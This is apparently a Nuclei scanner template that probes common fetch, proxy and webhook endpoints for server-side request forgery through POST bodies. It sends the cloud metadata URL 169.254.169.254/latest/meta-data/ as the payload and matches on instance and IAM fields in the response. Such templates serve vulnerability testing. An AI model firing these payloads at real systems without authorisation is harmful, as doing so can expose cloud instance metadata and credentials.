id: m7-ssrf-post-body
info:
  name: M7 - SSRF via POST Body Parameters
  author: Sharlix
  severity: high
  description: Tests POST body parameters for SSRF (often missed by GET-only scanners)
  tags: ssrf,post,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/fetch"
      - "{{BaseURL}}/api/proxy"
      - "{{BaseURL}}/api/request"
      - "{{BaseURL}}/webhook"
      - "{{BaseURL}}/proxy"
      - "{{BaseURL}}/fetch"

    body: |
      {"url": "http://169.254.169.254/latest/meta-data/"}

    headers:
      Content-Type: application/json

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "ami-id"
          - "instance-id"
          - "local-ipv4"
          - "iam"
        part: body
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/fetch"
      - "{{BaseURL}}/webhook"

    body: "url=http://169.254.169.254/latest/meta-data/"

    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "ami-id"
          - "instance-id"
        part: body
        condition: or
